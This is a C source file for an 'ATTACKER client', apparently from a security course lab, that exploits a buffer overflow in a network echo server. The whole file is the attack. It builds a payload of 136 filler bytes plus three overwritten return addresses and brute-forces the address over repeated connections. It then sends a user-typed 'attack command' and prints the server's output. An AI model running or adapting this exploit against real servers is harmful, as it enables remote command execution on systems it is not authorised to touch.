/*
  ATTACKER client
  ==========
*/


#include <sys/socket.h>       /*  socket definitions        */
#include <sys/types.h>        /*  socket types              */
#include <arpa/inet.h>        /*  inet (3) funtions         */
#include <unistd.h>           /*  misc. UNIX functions      */
#include <netinet/in.h>
#include <netdb.h>

#include "helper.h"           /*  Our own helper functions  */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int ParseCmdLine(int , char **, char **, char **);

unsigned long  ATTACK_ADDRESS; 
int  ATTACK_CYCLES ; 

#define STEP 1

const char dummy_chars[136];

#define MAX_LINE           (1024)

char attackstring[MAX_LINE];		/*  the actual string passed to the server */
char output[4096];



int main(int argc, char *argv[]) {
    int       conn_s;                /*  connection socket         */
    short int port;                  /*  port number               */
    struct    sockaddr_in servaddr;  /*  socket address structure  */
    char      buffer[MAX_LINE];      /*  character buffer          */
    char     *szAddress;             /*  Holds remote IP address   */
    char     *szPort;                /*  Holds remote port         */
    char     *endptr;                /*  for strtol()              */
    struct  hostent *he;
    int ret;
    struct timeval	timer;

    int i;

    he=NULL;
    buffer[0] = '\0';

    /*  Get command line arguments  */

    ParseCmdLine(argc, argv, &szAddress, &szPort);

    if(argc < 7){
        printf("also need an attack address and a number fo attack cycles to carry out\n");
        exit(EXIT_FAILURE);
    }

    ATTACK_ADDRESS = (unsigned long)(strtoul(argv[5],NULL,16));
    ATTACK_CYCLES = (unsigned long)(strtol(argv[6],NULL,10));

    printf("Starting attack at address %p\n",(void*)ATTACK_ADDRESS);


attack:

    /*  Set the remote port  */

    port = strtol(szPort, &endptr, 0);
    if ( *endptr ) {
	printf("client: unmanaged port.\n");
	exit(EXIT_FAILURE);
    }
    

    /*  Create the listening socket  */

    if ( (conn_s = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
	fprintf(stderr, "client: socket creation error.\n");
	exit(EXIT_FAILURE);
    }


    /*  Set all bytes in socket address structure to
        zero, and fill in the relevant data members   */

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family      = AF_INET;
    servaddr.sin_port        = htons(port);


    /*  Set the remote IP address  */

    if ( inet_aton(szAddress, &servaddr.sin_addr) <= 0 ) {
	printf("client: resolving the host name ...");
	
	if ((he=gethostbyname(szAddress)) == NULL) {
	    printf("faulure.\n");
	    exit(EXIT_FAILURE);
	}
	printf("OK.\n\n");
	servaddr.sin_addr = *((struct in_addr *)he->h_addr);
    }
    
    
    
    /*  connect() to the remote echo server  */

    if ( connect(conn_s, (struct sockaddr *) &servaddr, sizeof(servaddr) ) < 0 ) {
	printf("client: connection error.\n");
	exit(EXIT_FAILURE);
    }


    /*  assemble attack string */


    memcpy(attackstring,dummy_chars,136);
    memcpy((char*)attackstring+136,(char*)&ATTACK_ADDRESS,sizeof(ATTACK_ADDRESS));
    ATTACK_ADDRESS += 64;
    memcpy((char*)attackstring+136+sizeof(ATTACK_ADDRESS),(char*)&ATTACK_ADDRESS,sizeof(ATTACK_ADDRESS));
    ATTACK_ADDRESS += 64;
    memcpy((char*)attackstring+136+2*sizeof(ATTACK_ADDRESS),(char*)&ATTACK_ADDRESS,sizeof(ATTACK_ADDRESS));

   ATTACK_ADDRESS -= 128;

    write(conn_s,attackstring,136+3*sizeof(ATTACK_ADDRESS)); //144

    if(strcmp(buffer,"") == 0 ){
	
  	printf("Please insert attack command: ");
    	fgets(buffer, MAX_LINE, stdin);
	
    }

    
    /*  Send attack string to server  */
 
    sleep(1);

    timer.tv_sec  =  1;
    timer.tv_usec = 0;
    setsockopt(conn_s, SOL_SOCKET, SO_RCVTIMEO, &timer, sizeof(timer));


    Writeline(conn_s, buffer, strlen(buffer));
    ret = read(conn_s,output,4096);
    write(1,output,ret);

    ret = read(conn_s,output,4096);
    write(1,output,ret);

    close(conn_s);

    ATTACK_CYCLES--;
    ATTACK_ADDRESS += STEP;

    if(ATTACK_CYCLES >= 0) goto attack;

    return EXIT_SUCCESS;
}


int ParseCmdLine(int argc, char *argv[], char **szAddress, char **szPort)
{
    int n = 1;

    while ( n < argc ) {
	if ( !strncmp(argv[n], "-a", 2) || !strncmp(argv[n], "-A", 2) ) {
	    *szAddress = argv[++n];
	}
	else 
	    if ( !strncmp(argv[n], "-p", 2) || !strncmp(argv[n], "-P", 2) ) {
		*szPort = argv[++n];
	    }
	else
	    if ( !strncmp(argv[n], "-h", 2) || !strncmp(argv[n], "-H", 2) ) {
		printf("usage:\n\n");
		printf("    progname -a (server address) -p (server port) [-h].\n\n");
		exit(EXIT_SUCCESS);
	    }
	++n;
    }
    if (argc==1) {
	printf("usage:\n\n");
	printf("    progname -a (server address) -p (server port) [-h].\n\n");
	exit(EXIT_SUCCESS);
    }
    return 0;
}
